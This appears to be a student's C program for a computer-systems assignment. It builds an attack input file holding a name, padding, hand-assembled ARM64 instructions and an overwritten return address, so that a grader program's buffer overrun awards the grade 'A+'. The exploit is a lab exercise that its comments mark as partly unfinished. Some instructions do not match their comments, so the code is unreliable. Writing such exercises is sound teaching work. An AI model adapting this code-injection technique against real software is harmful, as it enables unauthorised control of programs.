/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/


#include <stdio.h>
#include <string.h>
#include "miniassembler.h"
enum {BUFSIZE = 48};

/*--------------------------------------------------------------------*/


/* 
*/

int main(void)
{
   unsigned int i;
   unsigned int uiInstr;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   psFile = fopen("dataAplus", "w");
   psName = "SeanW";

   /* Writes the student's name to the dataA file */
   for (i = 0; i<strlen(psName); i++){
       fprintf(psFile, "%c", psName[i]);
   }
   /* Writes filler to the dataA file
   so instruction starts at multiple of 4 */
   for (i = 0; i<3; i++){
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the instruction mov w0, ‘A’ */
   uiInstr = MiniAssembler_mov(0, 'A');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Writes the instruction bl printf - NOT WORKING RN */
   uiInstr = MiniAssembler_mov(0, 'A');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction mov w0, ‘A’ */
   uiInstr = MiniAssembler_mov(0, '+');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
   /* Writes the instruction adr x1, grade */
   uiInstr = MiniAssembler_adr(1, 0x420044,
   0x42006C);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction strb w0, [x1] */
   uiInstr = MiniAssembler_strb(0,1);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction b 0x400864 (call of printf) */
   uiInstr = MiniAssembler_b(0x400864, 0x420074);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes enough null bytes to the dataB file
   to overrun until X30 */
   for (i = 0; i<BUFSIZE-32; i++){
       fprintf(psFile, "%c", 0x00);
   }

/* Writes the address which corresponds to 
   instruction: mov w0, ‘A’ in BSS section */
   ulData = 0x420060;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   fclose(psFile);


   return 0;
}




/* structure of BSS section (within buffer):

student name

buffer so it's a multiple of 4

mov w0, 'A'
bl putchar
mov w0, '+'
bl putchar
mov w0, '\0'
adr x1, grade
strb w0, [x1]
b 0x40085c (call of printf)
overrun until x30
write address
*/